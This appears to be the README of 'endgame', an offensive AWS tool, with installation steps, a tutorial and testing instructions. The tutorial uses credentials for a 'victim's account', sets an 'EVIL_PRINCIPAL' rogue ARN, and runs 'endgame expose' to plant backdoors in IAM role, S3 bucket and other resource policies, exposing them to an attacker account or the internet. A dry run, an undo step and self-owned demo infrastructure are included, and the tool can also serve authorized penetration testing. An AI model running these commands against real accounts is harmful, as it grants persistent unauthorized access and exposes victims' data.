# endgame

Share an AWS account's resources with a rogue AWS Account - or to the entire internet 😈

## Installation

* Install

```bash
make install
```

## Tutorial

### Setup

* First, authenticate to AWS CLI using credentials to the victim's account.

* Set `EVIL_PRINCIPAL` environment variable to the rogue IAM User or Role that you want to give access to.

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
```

* (_Optional_) Set `AWS_REGION` to the AWS Region and `AWS_PROFILE` to the profile in `~/.aws/credentials` that you want to use.

```bash
# If you don't supply these values, these will be the defaults.
export AWS_REGION="us-east-1"
export AWS_PROFILE="default"
```

### Create Demo Infrastructure

* 🚨This will create real AWS infrastructure and will cost you money! 🚨

```bash
make terraform-demo
```

> _Note: It is not exposed to rogue IAM users or to the internet at first. That will only happen after you run the exposure commands._

### `list-resources`: List resources to expose

Help page:

```
Usage: cli.py list-resources [OPTIONS]

  List AWS resources to expose.

Options:
  -s, --service TEXT   The AWS service in question. Valid arguments: acm-pca,
                       ecr, efs, elasticsearch, glacier, lambda, lambda-layer,
                       cloudwatch, iam, kms, s3, secretsmanager, ses, sns, sqs
                       [required]

  --profile, --p TEXT  Specify the AWS IAM profile.
  -r, --region TEXT    The AWS region
  -v, --verbose
```

* Examples:

```bash
# List IAM Roles, so you can create a backdoor via their AssumeRole policies
endgame list-resources -s iam

# List S3 buckets, so you can create a backdoor via their Bucket policies 
endgame list-resources --service s3
```

### `expose`: Expose resources by creating backdoors

#### Dry run

* Exploit resources (dry run)

```bash
endgame expose \
    --service iam \
    --name test-resource-exposure \
    --dry-run
```

It will output the following:

> ![Expose dry run](docs/images/add-myself-dry-run.png)

#### Create backdoor

* Expose resources (🚨this is not a drill🚨)

```
endgame expose --service iam --name test-resource-exposure
```

Example output:

> ![Expose for real](docs/images/add-myself-foreal.png)

#### Undo/Remove the backdoor

It will output the following:

> ![Expose undo](docs/images/add-myself-undo.png)

### Backdoors via Sharing APIs

| Backdoored Resource Type      | Support Status |
|-------------------------------|----------------|
| EC2 AMIs                      | ❌             |
| EBS Snapshots                 | ❌             |
| RDS Snapshots                 | ❌             |
| RDS DB Cluster Snapshots      | ❌             |

### Resources not on roadmap

| Resource Type                 | Support Status |
|-------------------------------|----------------|
| S3 Objects                    | ❌             |
| CloudWatch Destinations       | ❌             |
| Glue                          | ❌             |

* **S3 Buckets**: We do not plan on sharing individual S3 objects given the sheer amount of bandwidth that would require. If you want this feature, I suggest scripting it.
* **CloudWatch Destinations**: Modifying CloudWatch destination policies would only provide the benefit of delivering victim logs to attacker accounts - but that would have to be open permanently. This is not as destructive or useful to an attacker as the rest of these exploits, so I am not including it here.
* **Glue**: According to the [AWS documentation on AWS Glue Resource Policies](https://docs.aws.amazon.com/glue/latest/dg/glue-resource-policies.html), _"An AWS Glue resource policy can only be used to manage permissions for Data Catalog resources. You can't attach it to any other AWS Glue resources such as jobs, triggers, development endpoints, crawlers, or classifiers"_. This kind of data access is not as useful as destructive actions, at first glance. We are open to supporting this resource, but on pull requests only.

## Testing

### Unit tests


* Run [pytest](https://docs.pytest.org/en/stable/) with the following:

```bash
make test
```

### Security tests

* Run [bandit](https://bandit.readthedocs.io/en/latest/) with the following:

```bash
make security-test
```

### Demo Infrastructure

This program makes modifications to live AWS Infrastructure, which can vary from account to account. We have bootstrapped some of this for you.

* You can create example Terraform infrastructure with the following:

```bash
# To create the demo infrastructure
make terraform-demo

# To destroy the demo infrastructure
make terraform-destroy
```

### Integration tests

After making any modifications to the program, you can run a full-fledged integration test, using this program against your own test infrastructure in AWS.

* First, set your environment variables

```bash
# Set the environment variable for the username that you will create a backdoor for.
export EVIL_PRINCIPAL="arn:aws:iam::999988887777:user/evil"
export AWS_REGION="us-east-1"
export AWS_PROFILE="default"
```

* Then run the full-fledged integration test:

```bash
make integration-test
```

This does the following:
* Sets up your local dev environment (see `setup-dev`) in the `Makefile`
* Creates the Terraform infrastructure (see `terraform-demo` in the `Makefile`)
* Runs `list-resources`, `exploit --dry-run`, and `expose` against this live infrastructure
* Destroys the Terraform infrastructure (see `terraform-destroy` in the `Makefile`)

Note that the `expose` command will not expose the resources to the world - it will only expose them to your rogue user, not to the world.
